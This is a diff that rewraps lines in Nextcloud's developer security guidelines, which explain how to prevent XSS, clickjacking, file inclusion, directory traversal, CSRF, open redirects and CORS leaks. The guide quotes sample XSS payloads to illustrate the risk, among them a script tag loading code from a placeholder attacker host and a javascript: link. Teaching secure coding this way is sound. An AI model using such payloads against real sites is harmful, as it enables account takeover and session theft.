@@ -4,7 +4,8 @@ Security guidelines
 
 .. sectionauthor:: Bernhard Posselt <dev@bernhard-posselt.com>, Lukas Reschke <lukas@statuscode.ch>
 
-This guideline highlights some of the most common security problems and how to prevent them. Please review your app if it contains any of the following security holes.
+This guideline highlights some of the most common security problems and how to prevent them. Please review your app if
+it contains any of the following security holes.
 
 .. note:: **Program defensively**: for instance always check for CSRF or escape strings, even if you do not need it. This prevents future problems where you might miss a change that leads to a security hole.
 
@@ -40,7 +41,9 @@ Cross site scripting
 
 `Cross site scripting <https://en.wikipedia.org/wiki/Cross-site_scripting>`_ happens when user input is passed directly to templates. A potential attacker might be able to inject HTML/JavaScript into the page to steal the users session, log keyboard entries, even perform DDOS attacks on other websites or other malicious actions.
 
-Despite the fact that Nextcloud uses Content-Security-Policy to prevent the execution of inline JavaScript code developers are still required to prevent XSS. CSP is just another layer of defense that is not implemented in all web browsers.
+Despite the fact that Nextcloud uses Content-Security-Policy to prevent the execution of inline JavaScript code
+developers are still required to prevent XSS. CSP is just another layer of defense that is not implemented in all web
+browsers.
 
 To prevent XSS in your app you have to sanitize the templates and all JavaScripts which performs a DOM manipulation.
 
@@ -58,21 +61,24 @@ An attacker might now easily send the user a link to::
 
     app.php?username=<script src="attacker.tld"></script>
 
-to overtake the user account. The same problem occurs when outputting content from the database or any other location that is writable by users.
+to overtake the user account. The same problem occurs when outputting content from the database or any other location
+that is writable by users.
 
 Another attack vector that is often overlooked is XSS in **href** attributes. HTML allows to execute JavaScript in href attributes like this::
 
     <a href="javascript:alert('xss')">
 
 
-To prevent XSS in your app, **never use echo, print() or <\%=** - use **p()** instead which will sanitize the input. Also **validate URLs to start with the expected protocol** (starts with http for instance)!
+To prevent XSS in your app, **never use echo, print() or <\%=** - use **p()** instead which will sanitize the input.
+Also **validate URLs to start with the expected protocol** (starts with http for instance)!
 
 .. note:: Should you ever require to print something unescaped, double check if it is really needed. If there is no other way (e.g. when including of subtemplates) use `print_unescaped`  with care.
 
 JavaScript
 ^^^^^^^^^^
 
-Avoid manipulating the HTML directly via JavaScript, this often leads to XSS since people often forget to sanitize variables:
+Avoid manipulating the HTML directly via JavaScript, this often leads to XSS since people often forget to sanitize
+variables:
 
 .. code-block:: js
 
@@ -98,23 +104,27 @@ An even better way to make your app safer is to use the jQuery built-in function
 
   messageTd.text(username);
 
-It may also be wise to choose a proper JavaScript framework like Vue.js which automatically handles the JavaScript escaping for you.
+It may also be wise to choose a proper JavaScript framework like Vue.js which automatically handles the JavaScript
+escaping for you.
 
 Clickjacking
 ------------
 
 `Clickjacking <https://en.wikipedia.org/wiki/Clickjacking>`_ tricks the user to click into an invisible iframe to perform an arbitrary action (e.g. delete a user account)
 
-To prevent such attacks Nextcloud sends the `X-Frame-Options` header to all template responses. Don't remove this header if you don't really need it!
+To prevent such attacks Nextcloud sends the `X-Frame-Options` header to all template responses. Don't remove this header
+if you don't really need it!
 
 This is already built into Nextcloud in :php:class:`OC_Template`.
 
 Code executions / file inclusions
 ---------------------------------
 
-Code Execution means that an attacker is able to include an arbitrary PHP file. This PHP file runs with all the privileges granted to the normal application and can do an enormous amount of damage.
+Code Execution means that an attacker is able to include an arbitrary PHP file. This PHP file runs with all the
+privileges granted to the normal application and can do an enormous amount of damage.
 
-Code executions and file inclusions can be easily prevented by **never** allowing user-input to run through the following functions:
+Code executions and file inclusions can be easily prevented by **never** allowing user-input to run through the
+following functions:
 
 * **include()**
 * **require()**
@@ -136,7 +146,9 @@ Code executions and file inclusions can be easily prevented by **never** allowin
 Directory traversal
 -------------------
 
-Very often developers forget about sanitizing the file path (removing all \\ and /), this allows an attacker to traverse through directories on the server which opens several potential attack vectors including privilege escalations, code executions or file disclosures.
+Very often developers forget about sanitizing the file path (removing all \\ and /), this allows an attacker to traverse
+through directories on the server which opens several potential attack vectors including privilege escalations, code
+executions or file disclosures.
 
 **DON'T**
 
@@ -204,14 +216,17 @@ Nextcloud offers three simple checks:
 * **OCP\\JSON::checkAdminUser()**: Checks if the logged in user has admin privileges
 * **OCP\\JSON::checkSubAdminUser()**: Checks if the logged in user has group admin privileges
 
-Using the App Framework, these checks are already automatically performed for each request and have to be explicitly turned off by using annotations above your controller method,  see :doc:`../basics/controllers`.
+Using the App Framework, these checks are already automatically performed for each request and have to be explicitly
+turned off by using annotations above your controller method,  see :doc:`../basics/controllers`.
 
-Additionally always check if the user has the right to perform that action. (e.g. a user should not be able to delete other users' bookmarks).
+Additionally always check if the user has the right to perform that action. (e.g. a user should not be able to delete
+other users' bookmarks).
 
 Sensitive data exposure
 -----------------------
 
-Always store user data or configuration files in safe locations, e.g. **nextcloud/data/** and not in the webroot where they can be accessed by anyone using a web browser.
+Always store user data or configuration files in safe locations, e.g. **nextcloud/data/** and not in the webroot where
+they can be accessed by anyone using a web browser.
 
 .. _csrf_introduction:
 
@@ -229,16 +244,20 @@ To prevent CSRF in an app, be sure to call the following method at the top of al
   <?php
   OCP\JSON::callCheck();
 
-If you are using the App Framework, every controller method is automatically checked for CSRF unless you explicitly exclude it by setting the ``#[NoCSRFRequired]`` attribute or ``@NoCSRFRequired`` annotation before the controller method, see :doc:`../basics/controllers`.
+If you are using the App Framework, every controller method is automatically checked for CSRF unless you explicitly
+exclude it by setting the ``#[NoCSRFRequired]`` attribute or ``@NoCSRFRequired`` annotation before the controller
+method, see :doc:`../basics/controllers`.
 
 Additionally, it is advised to carefully select the HTTP method used for requests.
 Requests of type ``GET`` should not alter data but just read existing data.
-This way, at least no typed (or copied) URL might alter data (e.g. clicking a link from a spam mail message by accident).
+This way, at least no typed (or copied) URL might alter data (e.g. clicking a link from a spam mail message by
+accident).
 
 Unvalidated redirects
 ---------------------
 
-This is more of an annoyance than a critical security vulnerability since it may be used for social engineering or phishing.
+This is more of an annoyance than a critical security vulnerability since it may be used for social engineering or
+phishing.
 
 Always validate the URL before redirecting if the requested URL is on the same domain or an allowed resource.
 
@@ -263,8 +282,10 @@ CORS
 `Cross-origin resource sharing (CORS) <https://en.wikipedia.org/wiki/Cross-origin_resource_sharing>`_ (see also on `MDN <https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS>`__) is a method implemented by browser to access resources from different domains at the same time.
 Assume, there is a website published on host A.
 The URL would for example be ``https://A/path/to/index.html``.
-If there is a _different_ host B that serves a resource (e.g. an image file) as ``https://B/assets/image.jpg``, the index file on host A could simply link to the image on B.
-However, to protect B and its property (the image), the browsers do not silently embed the image of B into the page of A.
+If there is a _different_ host B that serves a resource (e.g. an image file) as ``https://B/assets/image.jpg``, the
+index file on host A could simply link to the image on B.
+However, to protect B and its property (the image), the browsers do not silently embed the image of B into the page of
+A.
 Instead, B is kindly asked by the browser if embedding is allowed (the so-called `preflight <https://developer.mozilla.org/en-US/docs/Glossary/Preflight_request>`_).
 
 To do so, there is a first request made to the resource on B with the ``OPTIONS`` HTTP command/verb.
@@ -273,9 +294,12 @@ These define, what the browser is to be allowed to do.
 Only if the destination server B confirms cross site resource sharing is allowed, the browser access the resource.
 
 Basically, accessing foreign resources is not limited to embedding images.
-Using JavaScript, arbitrary XHR/Ajax requests can be directed at arbitrary other hosts, which might be used to call APIs that leak your data.
-There are some safety measurements in place (especially about cookie handling), but one has still to be careful not to leak information unwillingly.
-Especially, if the destination server B allows to sent credentials using ``Access-Control-Allow-Credentials: true``, cross site scripting is very critical.
+Using JavaScript, arbitrary XHR/Ajax requests can be directed at arbitrary other hosts, which might be used to call APIs
+that leak your data.
+There are some safety measurements in place (especially about cookie handling), but one has still to be careful not to
+leak information unwillingly.
+Especially, if the destination server B allows to sent credentials using ``Access-Control-Allow-Credentials: true``,
+cross site scripting is very critical.
 You need :ref:`CSRF protection <csrf_introduction>` in place or your users are at relatively high risk.
 
 Getting help
